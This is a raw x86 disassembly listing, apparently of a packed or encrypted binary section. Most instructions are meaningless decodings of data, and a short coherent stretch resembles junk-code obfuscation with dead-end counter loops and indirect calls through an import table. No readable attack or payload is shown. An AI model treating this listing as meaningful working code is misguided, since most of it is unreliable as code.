  40abc5:	pop    ebx
  40abc6:	loope  0x40ac35
  40abc8:	mov    eax,fs
  40abca:	out    dx,al
  40abcb:	ins    DWORD PTR es:[edi],dx
  40abcc:	imul   esi,ebp,0x91bd6e9e
  40abd2:	jne    0x40ab74
  40abd4:	cmp    dh,BYTE PTR [edx+ebx*8+0x107142f4]
  40abdb:	mov    ds:0xbab9df33,eax
  40abe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe1:	retf   
  40abe2:	inc    esi
  40abe3:	sbb    al,0xb1
  40abe5:	rcr    BYTE PTR [edi],cl
  40abe7:	sub    ecx,DWORD PTR [eax]
  40abe9:	das    
  40abea:	scas   al,BYTE PTR es:[edi]
  40abeb:	mov    ecx,DWORD PTR [ebx+0x78076dbc]
  40abf1:	imul   edi,DWORD PTR ds:0x7fa7f95,0x21
  40abf8:	xchg   esi,eax
  40abf9:	dec    esi
  40abfa:	je     0x40ac1a
  40abfc:	test   eax,0xf7fd3bce
  40ac01:	loope  0x40abbc
  40ac03:	mov    ds:0xc7241a8b,eax
  40ac08:	mov    bl,0x3c
  40ac0a:	pusha  
  40ac0b:	aaa    
  40ac0c:	mov    ds:0xad75a31b,al
  40ac11:	adc    al,al
  40ac13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac14:	xchg   ecx,eax
  40ac15:	jb     0x40ac52
  40ac17:	lock shr eax,0x87
  40ac1b:	scas   eax,DWORD PTR es:[edi]
  40ac1c:	dec    edx
  40ac1d:	xchg   ebp,eax
  40ac1e:	arpl   WORD PTR [edi-0x54bcd5da],ax
  40ac24:	lahf   
  40ac25:	hlt    
  40ac26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac27:	cld    
  40ac28:	jnp    0x40ac0e
  40ac2a:	or     esi,edx
  40ac2c:	sbb    al,0x56
  40ac2e:	mov    ebx,es
  40ac30:	mov    DWORD PTR [ebx+edx*2+0x3f572ea],ecx
  40ac37:	inc    esi
  40ac38:	mov    esi,esp
  40ac3a:	(bad)  
  40ac3b:	jmp    0x40aca5
  40ac3d:	mov    dl,0xb6
  40ac3f:	dec    edx
  40ac40:	pusha  
  40ac41:	rcl    dx,0xd4
  40ac45:	lahf   
  40ac46:	or     ecx,eax
  40ac48:	xchg   BYTE PTR [ebx+ebx*4-0x853f97e],cl
  40ac4f:	outs   dx,DWORD PTR ds:[esi]
  40ac50:	dec    ebx
  40ac51:	and    DWORD PTR ss:[ebx],esi
  40ac54:	add    dh,BYTE PTR [edi+0x23]
  40ac57:	cmp    BYTE PTR [edi+0x302df560],0x1d
  40ac5e:	pop    ecx
  40ac5f:	sub    eax,0xce2975a4
  40ac64:	pop    ebx
  40ac65:	jge    0x40acac
  40ac67:	fst    st(7)
  40ac69:	push   DWORD PTR [eax]
  40ac6b:	fucom  st(3)
  40ac6d:	iret   
  40ac6e:	sbb    edi,DWORD PTR [eax]
  40ac70:	stos   DWORD PTR es:[edi],eax
  40ac71:	cmp    al,0xd9
  40ac73:	out    0x39,al
  40ac75:	(bad)  
  40ac76:	fcmovnu st,st(3)
  40ac78:	retf   
  40ac79:	push   ecx
  40ac7a:	push   esp
  40ac7b:	lods   eax,DWORD PTR ds:[esi]
  40ac7c:	stc    
  40ac7d:	aam    0xa4
  40ac7f:	inc    esi
  40ac80:	ror    BYTE PTR [ebp+0x508f9def],cl
  40ac86:	jg     0x40ad06
  40ac88:	xor    bl,BYTE PTR [ebx+0x2ac7120]
  40ac8e:	adc    eax,0x6536cc16
  40ac93:	pop    ecx
  40ac94:	and    eax,0xc55d47a1
  40ac99:	ret    0x46ef
  40ac9c:	xchg   esi,eax
  40ac9d:	mov    ch,0x82
  40ac9f:	cmp    eax,0xb2572c5f
  40aca4:	and    al,0x43
  40aca6:	loope  0x40ac8a
  40aca8:	jb     0x40acdd
  40acaa:	aaa    
  40acab:	or     eax,0xa18d7ec1
  40acb0:	daa    
  40acb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acb2:	push   esi
  40acb3:	cmp    bl,BYTE PTR ds:0xbe42ab4d
  40acb9:	or     ch,0x11
  40acbc:	adc    cl,bl
  40acbe:	cmp    ebx,DWORD PTR [edx]
  40acc0:	ror    DWORD PTR [edx],1
  40acc2:	(bad)  
  40acc4:	stos   BYTE PTR es:[edi],al
  40acc5:	inc    esi
  40acc6:	cmp    bh,BYTE PTR [edx+0x14a53bdc]
  40accc:	add    al,0x4d
  40acce:	xor    al,0x81
  40acd0:	ret    
  40acd1:	out    0x57,eax
  40acd3:	scas   eax,DWORD PTR es:[edi]
  40acd4:	mov    ecx,0x690248be
  40acd9:	pop    ebx
  40acda:	adc    eax,DWORD PTR [esi-0x2e0af9b5]
  40ace0:	push   edi
  40ace1:	imul   esi,ebp,0x36
  40ace4:	push   cs
  40ace5:	ret    
  40ace6:	cwde   
  40ace7:	sub    DWORD PTR [ecx],edi
  40ace9:	fdiv   QWORD PTR [edx+edi*2]
  40acec:	shr    ebp,1
  40acee:	xor    DWORD PTR [ecx+0x3e],ebp
  40acf1:	mov    bh,0xe7
  40acf3:	nop
  40acf4:	out    0xdc,al
  40acf6:	jmp    0x40ad3c
  40acf8:	in     al,dx
  40acf9:	push   es
  40acfa:	dec    eax
  40acfb:	xor    eax,0x23012c81
  40ad00:	shl    BYTE PTR [edx-0x49],0xb3
  40ad04:	stos   BYTE PTR es:[edi],al
  40ad05:	(bad)  
  40ad06:	sbb    eax,0xc8a7a70d
  40ad0b:	jnp    0x40acd5
  40ad0d:	cmp    ah,BYTE PTR [edx]
  40ad0f:	fdivr  DWORD PTR [edx+edi*2]
  40ad12:	and    eax,0x5400755
  40ad17:	enter  0x776,0x78
  40ad1b:	inc    BYTE PTR [edi-0x632ad0c9]
  40ad21:	xchg   edi,eax
  40ad22:	mov    edi,0x3e6dd7de
  40ad27:	cwde   
  40ad28:	cmc    
  40ad29:	sbb    al,0x6c
  40ad2b:	inc    esi
  40ad2c:	into   
  40ad2d:	add    eax,0x51e2003e
  40ad32:	and    ah,0xef
  40ad35:	repz in al,dx
  40ad37:	mov    dh,0x22
  40ad39:	or     bl,BYTE PTR [esi-0x4b]
  40ad3c:	std    
  40ad3d:	fstp   st(5)
  40ad3f:	outs   dx,DWORD PTR ds:[esi]
  40ad41:	ja     0x40ad92
  40ad43:	dec    edx
  40ad44:	push   edi
  40ad45:	cdq    
  40ad46:	or     eax,0x7a60796a
  40ad4b:	add    ebp,DWORD PTR [ecx]
  40ad4d:	fsubrp st(3),st
  40ad4f:	pop    ebp
  40ad50:	xor    eax,0xb08afbed
  40ad55:	mov    ecx,0x85161de
  40ad5a:	jge    0x40acf2
  40ad5c:	mov    ecx,0x7ed773aa
  40ad61:	leave  
  40ad62:	leave  
  40ad63:	push   edi
  40ad64:	stos   BYTE PTR es:[edi],al
  40ad65:	daa    
  40ad66:	shl    DWORD PTR [eax],0x41
  40ad69:	jmp    0x40ad9f
  40ad6b:	cmp    eax,0x9970cc5c
  40ad70:	cdq    
  40ad71:	out    0xc4,al
  40ad73:	dec    edi
  40ad74:	dec    esp
  40ad75:	adc    DWORD PTR [eax-0x442581d7],ebp
  40ad7b:	rcr    BYTE PTR [ebx],1
  40ad7d:	out    0xc8,eax
  40ad7f:	dec    edx
  40ad80:	je     0x40adf0
  40ad82:	out    dx,al
  40ad83:	dec    ebx
  40ad84:	stos   BYTE PTR es:[edi],al
  40ad85:	add    BYTE PTR [ebx],dl
  40ad87:	std    
  40ad88:	xor    DWORD PTR [edx],ecx
  40ad8a:	xor    eax,0xd8c3c162
  40ad8f:	xchg   esi,eax
  40ad90:	xchg   esi,eax
  40ad91:	out    dx,eax
  40ad92:	mov    esp,0xc98b20d
  40ad97:	mov    edi,0x72df2026
  40ad9c:	and    eax,0x634eaec3
  40ada1:	ret    
  40ada2:	push   eax
  40ada3:	outs   dx,DWORD PTR ds:[esi]
  40ada4:	mov    eax,0x289e9bcc
  40ada9:	pop    ss
  40adaa:	add    esi,ebx
  40adac:	enter  0x88ec,0x1b
  40adb0:	imul   esp,DWORD PTR ds:0x810c0010,0x4
  40adb7:	jl     0x40adea
  40adb9:	mov    edi,0x78289a21
  40adbe:	xor    eax,0x8f0d7590
  40adc3:	cmc    
  40adc4:	jle    0x40add6
  40adc6:	sub    eax,0x8f630a19
  40adcb:	mov    ebp,esp
  40adcd:	and    eax,0xab4774a8
  40add2:	cmp    eax,0xb5e78ad3
  40add7:	push   esp
  40add8:	mov    bl,0x5a
  40adda:	xchg   esi,eax
  40addb:	mov    bl,0x5d
  40addd:	fcomip st,st(4)
  40addf:	xor    BYTE PTR [ebx+0x6ff966cb],ah
  40ade5:	cmc    
  40ade6:	call   0x1d9:0xccd9fd1c
  40aded:	inc    ebx
  40adee:	loope  0x40adb6
  40adf0:	jecxz  0x40adc0
  40adf2:	sbb    esp,esi
  40adf4:	shl    DWORD PTR [ebx],0xdb
  40adf7:	dec    eax
  40adf8:	jns    0x40ae01
  40adfa:	outs   dx,DWORD PTR ds:[esi]
  40adfb:	dec    eax
  40adfc:	mov    esi,0xbd7c864b
  40ae01:	xchg   ebx,eax
  40ae02:	mov    DWORD PTR [esi+0xb],edx
  40ae05:	lock retf 
  40ae07:	xchg   dh,cl
  40ae09:	cmp    BYTE PTR [ebp+0x5e562bb4],0x62
  40ae10:	ret    0xeca3
  40ae13:	and    BYTE PTR [eax+0x3e],0x59
  40ae17:	cmp    eax,0xd24ce0f5
  40ae1c:	push   edi
  40ae1d:	sub    BYTE PTR [edx],dh
  40ae1f:	jle    0x40adfe
  40ae21:	inc    esi
  40ae22:	dec    esi
  40ae23:	mov    edi,DWORD PTR [eax]
  40ae25:	sbb    BYTE PTR [eax+0x4c],ch
  40ae28:	dec    eax
  40ae29:	push   ebx
  40ae2a:	lea    ebx,[ebx+0x276a1a0f]
  40ae30:	iret   
  40ae31:	and    ch,BYTE PTR ds:0x8945d2b6
  40ae37:	push   cs
  40ae38:	mov    esp,0xb8632fed
  40ae3e:	in     eax,dx
  40ae3f:	pop    edi
  40ae40:	mov    ecx,0x83cc55a5
  40ae45:	into   
  40ae46:	xchg   edi,eax
  40ae47:	xlat   BYTE PTR ds:[ebx]
  40ae48:	in     al,0xb
  40ae4a:	add    eax,0x111fd5b6
  40ae4f:	add    dh,ch
  40ae51:	mov    ds:0x6aae129c,eax
  40ae56:	stos   DWORD PTR es:[edi],eax
  40ae57:	ror    DWORD PTR ds:0xb81469ab,1
  40ae5d:	es jle 0x40ae82
  40ae60:	mov    gs,WORD PTR [ebp+0x5a]
  40ae63:	ret    
  40ae64:	jp     0x40ae05
  40ae66:	js     0x40ae4c
  40ae68:	(bad)  
  40ae6a:	jl     0x40aeea
  40ae6c:	sbb    bl,BYTE PTR [ecx]
  40ae6e:	mov    esp,0x8e57dbc3
  40ae73:	inc    ebx
  40ae74:	dec    eax
  40ae75:	add    eax,0xdcde772
  40ae7a:	mov    edx,0x3e12e408
  40ae7f:	ret    
  40ae80:	pop    ss
  40ae81:	mov    bh,0xb9
  40ae83:	inc    ecx
  40ae84:	push   0xe386b66d
  40ae89:	xor    ebp,DWORD PTR [ebx]
  40ae8b:	jae    0x40ae39
  40ae8d:	int    0xc1
  40ae8f:	xchg   ch,dh
  40ae91:	add    esp,DWORD PTR gs:[esp+esi*4]
  40ae95:	cld    
  40ae96:	xchg   esi,eax
  40ae97:	jmp    0xec8e785b
  40ae9c:	pop    esi
  40ae9d:	ds fldpi 
  40aea0:	sti    
  40aea1:	nop
  40aea2:	shl    ecx,0xc6
  40aea5:	adc    al,0x35
  40aea7:	iret   
  40aea8:	out    0xab,eax
  40aeaa:	sub    DWORD PTR [ebx],eax
  40aeac:	popf   
  40aead:	mov    al,BYTE PTR [edx-0x12]
  40aeb0:	fs dec ebp
  40aeb2:	cmp    DWORD PTR [edi],ebx
  40aeb4:	fwait
  40aeb5:	lods   al,BYTE PTR ds:[esi]
  40aeb6:	aaa    
  40aeb7:	retf   0x36ad
  40aeba:	stos   DWORD PTR es:[edi],eax
  40aebb:	xor    ebp,DWORD PTR [eax+0x42dd07fc]
  40aec1:	xchg   esi,eax
  40aec2:	and    eax,0xf973177f
  40aec7:	add    al,0x9f
  40aec9:	push   cs
  40aeca:	or     esp,DWORD PTR ds:0xaec32680
  40aed0:	add    edx,ecx
  40aed2:	imul   edx,edi
  40aed5:	xor    ebx,DWORD PTR ds:0x4346d3
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x4346c7,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x4346bf,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x43477f,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43470f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x43466f,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x4346bb,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x4346c7,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x4346c7
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x4346c7,ebx
  40af4d:	cmp    DWORD PTR ds:0x4346c7,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x4346c7,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x4346f7
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43470b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434793,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434793
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434793,ebx
  40afaa:	cmp    DWORD PTR ds:0x434793,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434793,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	je     0x40af87
  40affd:	pop    esp
  40affe:	mov    dh,dh
  40b000:	cli    
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	mov    bl,BYTE PTR [eax+0x4e]
  40b00a:	stos   DWORD PTR es:[edi],eax
  40b00b:	(bad)  
  40b00c:	pop    edx
  40b00d:	aaa    
  40b00e:	pop    ebp
  40b00f:	js     0x40afec
  40b011:	push   esp
  40b012:	dec    ebx
  40b013:	popa   
  40b014:	std    
  40b015:	mov    bh,BYTE PTR [ebx+0x70]
  40b018:	in     al,0x16
  40b01a:	adc    esi,DWORD PTR [eax]
  40b01c:	lahf   
  40b01d:	dec    ebp
  40b01e:	and    BYTE PTR [eax-0x12bcecf3],ah
  40b024:	stos   DWORD PTR es:[edi],eax
  40b025:	pop    ds
  40b026:	loop   0x40afa8
  40b028:	cmp    ebx,DWORD PTR [esi]
  40b02a:	test   al,0x98
  40b02c:	aam    0x62
  40b02e:	leave  
  40b02f:	cmp    eax,0xd1dfdcc9
  40b034:	ficom  DWORD PTR [eax]
  40b036:	cli    
  40b037:	ret    
  40b038:	cmp    eax,DWORD PTR [ebp-0x14da4fcd]
  40b03e:	or     BYTE PTR [eax-0x51cefedf],0x46
  40b045:	sar    BYTE PTR [ecx+0x1a],1
  40b048:	adc    al,0xda
  40b04a:	mov    eax,ds:0x27718855
  40b04f:	xchg   esp,eax
  40b050:	(bad)
  40b053:	mov    bh,0xac
  40b055:	mov    dh,0xaa
  40b057:	mov    esi,0x22cac408
  40b05c:	ja     0x40b03a
  40b05e:	mov    al,ds:0xf23d76a5
  40b063:	ficomp DWORD PTR [ecx]
  40b065:	jnp    0x40b0a6
  40b067:	call   0xc104c6ac
  40b06c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b06d:	sahf   
  40b06e:	(bad)  
  40b06f:	push   ebp
  40b070:	test   al,0xdb
  40b072:	mov    esi,0x55a4dabb
  40b077:	popf   
  40b078:	call   0x2c35:0x82e5ce81
  40b07f:	sbb    eax,0x3bbec19f
  40b084:	pop    eax
  40b085:	(bad)  
  40b086:	cmp    cl,BYTE PTR ds:0x88b7ca7
  40b08c:	int    0xdb
  40b08e:	xor    DWORD PTR [edx-0x453458c],0xf959fed1
  40b098:	ror    BYTE PTR ds:0xf955afe6,1
  40b09e:	pop    edx
  40b09f:	sbb    DWORD PTR [eax+0x10],esi
  40b0a2:	pop    edi
  40b0a3:	sub    dl,BYTE PTR [esi-0x275fbade]
  40b0a9:	loope  0x40b0e4
  40b0ab:	xchg   ebx,eax
  40b0ac:	xor    dl,BYTE PTR [ecx+edi*4+0x6efbd8e7]
  40b0b3:	stos   DWORD PTR es:[edi],eax
  40b0b4:	mov    al,ds:0x3ac1c77f
  40b0b9:	push   cs
  40b0ba:	or     al,0x6c
  40b0bc:	enter  0x4641,0xb8
  40b0c0:	jno    0x40b111
  40b0c2:	les    ebp,FWORD PTR [ebp+0x26]
  40b0c5:	ins    BYTE PTR es:[edi],dx
  40b0c6:	ins    DWORD PTR es:[edi],dx
  40b0c7:	dec    esp
  40b0c8:	fwait
  40b0c9:	in     al,0x29
  40b0cb:	and    BYTE PTR [esi],al
  40b0cd:	add    eax,0x1256de05
  40b0d2:	xchg   esi,eax
  40b0d3:	fiadd  WORD PTR [ebx-0x3]
  40b0d6:	(bad)  
  40b0d7:	cdq    
  40b0d8:	pop    eax
  40b0d9:	dec    edx
  40b0da:	jp     0x40b151
  40b0dc:	pop    eax
  40b0dd:	(bad)  
  40b0de:	jg     0x40b06e
  40b0e0:	pop    ss
  40b0e1:	addr16 inc edi
  40b0e3:	xchg   ebx,eax
  40b0e4:	pop    eax
  40b0e5:	xchg   ecx,eax
  40b0e6:	push   ss
  40b0e7:	jnp    0x40b0c0
  40b0e9:	jo     0x40b078
  40b0eb:	push   ss
  40b0ec:	cwde   
  40b0ed:	lahf   
  40b0ee:	xor    edx,DWORD PTR [ebp+0x6ff7ed7]
  40b0f4:	(bad)  
  40b0f6:	push   ebx
  40b0f7:	inc    edi
  40b0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0f9:	aam    0x49
  40b0fb:	aam    0xe
  40b0fd:	in     al,dx
  40b0fe:	in     eax,0xb
  40b100:	jecxz  0x40b168
  40b102:	(bad)  
  40b104:	push   ds
  40b105:	aaa    
  40b106:	(bad)
  40b109:	mov    ch,0xc8
  40b10b:	cmp    al,0x80
  40b10d:	push   esi
  40b10e:	mov    eax,ds:0x7492d77e
  40b113:	and    bh,BYTE PTR [edi]
  40b115:	jge    0x40b0d1
  40b117:	inc    ebp
  40b118:	aaa    
  40b119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b11a:	repnz and ch,BYTE PTR [edx+edx*8-0x694d280c]
  40b122:	mov    ch,0x64
  40b124:	xor    cl,BYTE PTR [edi+0xc]
  40b127:	rol    DWORD PTR [esi-0xe5b0768],0xbb
  40b12e:	sbb    BYTE PTR [edx+0x2],0xd3
  40b132:	mov    eax,ds:0x3af3dead
  40b137:	xlat   BYTE PTR ds:[ebx]
  40b138:	push   edx
  40b139:	dec    edi
  40b13a:	pop    dx
  40b13c:	and    al,0x6a
  40b13e:	fstp   QWORD PTR [esi]
  40b140:	push   esp
  40b141:	out    dx,eax
  40b142:	scas   al,BYTE PTR es:[edi]
  40b143:	jne    0x40b0cf
  40b145:	adc    DWORD PTR [eax+0x455da665],ebp
  40b14b:	fsubr  st,st(4)
  40b14d:	and    al,0xc
  40b150:	and    cl,bl
  40b152:	sbb    al,0xc0
  40b154:	sub    esp,DWORD PTR [esi+0x319f088f]
  40b15a:	mov    BYTE PTR [ecx],cl
  40b15c:	xor    al,0x32
  40b15e:	mov    DWORD PTR [edx+0x78],ebx
  40b161:	shl    BYTE PTR [eax+ecx*4],1
  40b164:	mov    esp,0xc61d98b
  40b169:	stos   DWORD PTR es:[edi],eax
  40b16a:	push   0x98cd8331
  40b16f:	push   ecx
  40b170:	(bad)  
  40b171:	call   0xaf797455
  40b176:	xor    al,0xca
  40b178:	pusha  
  40b179:	loope  0x40b164
  40b17b:	xor    al,0xee
  40b17d:	adc    al,0xcf
  40b17f:	ficom  WORD PTR [edx+0x47f6bc27]
  40b185:	or     eax,0xe84f3e2f
  40b18a:	pop    ecx
  40b18b:	mov    dl,0xbd
  40b18d:	xor    al,0x74
  40b18f:	pop    es
  40b190:	loopne 0x40b170
  40b192:	nop
  40b193:	rol    DWORD PTR [ecx+edx*8],0x4
  40b197:	cmp    eax,0x50bfa969
  40b19c:	je     0x40b126
  40b19e:	sub    eax,0xe4fa5b46
  40b1a3:	push   ebp
  40b1a4:	push   ecx
  40b1a5:	imul   edi,DWORD PTR [edx+0x70],0x23707c1
  40b1ac:	sbb    esi,DWORD PTR [ebx+ebx*4]
  40b1af:	mov    ecx,0xbf17d79f
  40b1b4:	push   es
  40b1b5:	test   eax,0x7b30cbe4
  40b1ba:	psubw  mm7,QWORD PTR es:[eax+0x15]
  40b1bf:	inc    ebx
  40b1c0:	xchg   esp,eax
  40b1c1:	inc    edi
  40b1c2:	js     0x40b1cd
  40b1c4:	push   0xffffffd0
  40b1c6:	test   DWORD PTR [edi*4-0x7092cf84],esi
  40b1cd:	sahf   
  40b1ce:	(bad)  
  40b1cf:	std    
  40b1d0:	inc    ebx
  40b1d1:	faddp  st(0),st
  40b1d3:	mov    edx,0x2c5c8e0d
  40b1d8:	jle    0x40b15c
  40b1da:	sub    BYTE PTR [edi+ecx*4-0x52b42271],bh
  40b1e1:	xor    DWORD PTR [esi+0x49],ebp
  40b1e4:	fstp   DWORD PTR [ebx+0x253fead2]
  40b1ea:	push   ebx
  40b1eb:	or     ebp,0xffffffcb
  40b1ee:	jb     0x40b1dc
  40b1f0:	leave  
  40b1f1:	cs imul ebx,edi,0xffffff9d
  40b1f5:	lds    edi,FWORD PTR [edx+0x6f]
  40b1f8:	sbb    DWORD PTR [edi],ebx
  40b1fa:	push   ss
  40b1fb:	adc    bl,BYTE PTR [ecx+0x19ef097a]
  40b201:	enter  0x2f5b,0x2b
  40b205:	sbb    eax,0xe1604f25
  40b20a:	ficom  WORD PTR [ecx]
  40b20c:	or     al,0x12
  40b20e:	add    esi,eax
  40b210:	std    
  40b211:	scas   al,BYTE PTR es:[edi]
  40b212:	mov    esi,0xb1f28bb9
  40b217:	jae    0x40b1dd
  40b219:	or     BYTE PTR [eax],dl
  40b21b:	xchg   esi,eax
  40b21c:	ret    0xa8c3
  40b21f:	and    al,0x69
  40b221:	arpl   WORD PTR [ebx],dx
  40b223:	push   es
  40b224:	add    eax,0x2cafc543
  40b229:	imul   esp,DWORD PTR [ebx],0x799b7862
  40b22f:	rol    BYTE PTR [edx+ebp*1],cl
  40b232:	mov    al,ds:0x987afa6e
  40b237:	mov    al,ds:0x34b984d0
  40b23c:	into   
  40b23d:	jae    0x40b250
  40b23f:	retf   0x7dbd
  40b242:	je     0x40b25f
  40b244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b245:	in     al,dx
  40b246:	out    0x57,eax
  40b248:	addr16 mov ecx,0xeee5aa36
  40b24e:	xor    DWORD PTR [ecx+0x78],esp
  40b251:	ins    DWORD PTR es:[edi],dx
  40b252:	or     DWORD PTR [ebx-0x76],ebp
  40b255:	cmp    esi,DWORD PTR [ecx-0x1]
  40b258:	or     BYTE PTR [ebx],ch
  40b25a:	popa   
  40b25b:	(bad)  
  40b25c:	xlat   BYTE PTR ds:[ebx]
  40b25d:	gs cld 
  40b25f:	jo     0x40b245
  40b261:	mov    ecx,DWORD PTR [eax+eiz*1-0x52]
  40b265:	cmp    edi,ecx
  40b267:	pop    es
  40b268:	mov    edi,0x843ac335
  40b26d:	(bad)  
  40b26e:	cli    
  40b26f:	jp     0x40b2d8
  40b271:	cmp    BYTE PTR [ecx-0x1d0247a8],dl
  40b277:	sbb    edx,DWORD PTR [eax+ebx*4+0x4]
  40b27b:	inc    esp
  40b27c:	push   ecx
  40b27d:	inc    eax
  40b27e:	mov    dh,0x2a
  40b280:	pop    esi
  40b281:	das    
  40b282:	in     eax,0x2e
  40b284:	sub    ebx,DWORD PTR [eax-0x43e66710]
  40b28a:	repz (bad) 
  40b28c:	stos   DWORD PTR es:[edi],eax
  40b28d:	xor    DWORD PTR [ebp+0x6aa29b59],ebx
  40b293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b294:	fsubr  QWORD PTR [edx+0x3fd80d45]
  40b29a:	sub    edi,0x20
  40b29d:	call   0xb0de83cf
  40b2a2:	push   ds
  40b2a3:	aaa    
  40b2a4:	sub    al,0x60
  40b2a6:	inc    esi
  40b2a7:	cmc    
  40b2a8:	ss in  al,dx
  40b2aa:	jbe    0x40b30b
  40b2ac:	jmp    0x7479ccf2
  40b2b1:	fidivr DWORD PTR [edx]
  40b2b3:	dec    ebx
  40b2b4:	adc    al,0x53
  40b2b6:	ror    BYTE PTR [edi],cl
  40b2b8:	mov    cl,0xc
  40b2ba:	rol    BYTE PTR [edx],1
  40b2bc:	ret    
  40b2bd:	ds pop ebp
  40b2bf:	aam    0x8c
  40b2c1:	idiv   ebp
  40b2c3:	xor    cl,cl
  40b2c5:	cs leave 
  40b2c7:	pop    esp
  40b2c8:	fcom   st(1)
  40b2ca:	fiadd  WORD PTR [ecx]
  40b2cc:	xor    al,0xda
  40b2ce:	icebp  
  40b2cf:	in     al,dx
  40b2d0:	pusha  
  40b2d1:	xchg   esp,eax
  40b2d2:	adc    edx,DWORD PTR ds:0xd3578229
  40b2d8:	ins    BYTE PTR es:[edi],dx
  40b2d9:	xchg   esp,eax
  40b2da:	and    BYTE PTR [ecx],ah
  40b2dc:	paddb  mm2,QWORD PTR ds:0x68b24a90
  40b2e3:	and    ebx,esi
  40b2e5:	and    al,0xb3
  40b2e7:	ins    BYTE PTR es:[edi],dx
  40b2e8:	ficomp WORD PTR [ebp+0x44af996e]
  40b2ee:	jmp    0x27771175
  40b2f3:	daa    
  40b2f4:	scas   eax,DWORD PTR es:[edi]
  40b2f5:	lods   eax,DWORD PTR ds:[esi]
  40b2f6:	pop    ebp
  40b2f7:	icebp  
  40b2f8:	jp     0x40b30c
  40b2fa:	cmp    DWORD PTR [edi],eax
  40b2fc:	push   es
  40b2fd:	adc    ch,BYTE PTR [edx]
  40b2ff:	push   esp
  40b300:	mov    DWORD PTR [ecx-0x1a65ba7],eax
  40b306:	inc    ecx
  40b307:	mov    dl,0xd5
  40b309:	test   al,0xee
  40b30b:	xor    ch,BYTE PTR [eax-0x5b]
  40b30e:	and    eax,0x7e17233
  40b313:	loope  0x40b30c
  40b315:	lea    edi,[esp+edi*1]
  40b318:	arpl   WORD PTR [edi-0x2bb1e80b],si
  40b31e:	push   ebp
  40b31f:	vandps ymm3,ymm1,YMMWORD PTR [edi+edx*2+0x420dddcb]
  40b328:	mov    ds:0xcae00966,al
  40b32d:	retf   
  40b32e:	sbb    DWORD PTR [ecx-0x11d600a6],ecx
  40b334:	jl     0x40b384
  40b336:	mov    ds:0x327f12d4,al
  40b33b:	xor    edx,eax
  40b33d:	gs stos DWORD PTR es:[edi],eax
  40b33f:	shr    DWORD PTR [edi],cl
  40b341:	xchg   DWORD PTR [ebx+eax*1],ebx
  40b344:	sbb    ch,BYTE PTR [eax+0x4efaa9bb]
  40b34a:	(bad)  
  40b34b:	mov    eax,0x47af2b83
  40b350:	adc    BYTE PTR [eax+0x14],ch
  40b353:	cmp    ecx,DWORD PTR [esp+edi*4+0x51]
  40b357:	in     al,0xf0
  40b359:	mov    al,0x50
  40b35b:	loopne 0x40b3b6
  40b35d:	push   ebp
  40b35e:	push   es
  40b35f:	js     0x40b3e0
  40b361:	jp     0x40b327
  40b363:	xchg   ecx,eax
  40b364:	cvttps2pi mm4,QWORD PTR [ecx]
  40b367:	(bad)  
  40b368:	xchg   ebx,eax
  40b369:	inc    edx
  40b36a:	fiadd  WORD PTR [ebp+0x4f7ff718]
  40b370:	xor    eax,ebp
  40b372:	dec    ebp
  40b373:	ror    DWORD PTR [edx+0x25],cl
  40b376:	leave  
  40b377:	mov    al,0xb
  40b379:	jmp    0x40b37f
  40b37b:	inc    eax
  40b37c:	add    eax,0x9fcd44a5
  40b381:	xchg   BYTE PTR [ebx],dh
  40b383:	fisttp QWORD PTR [ebx-0x59e2f1e4]
  40b389:	stos   BYTE PTR es:[edi],al
  40b38a:	xchg   ebp,eax
  40b38b:	mov    ecx,0x75b267e3
  40b390:	pop    edx
  40b391:	loop   0x40b3dd
  40b393:	outs   dx,DWORD PTR ds:[esi]
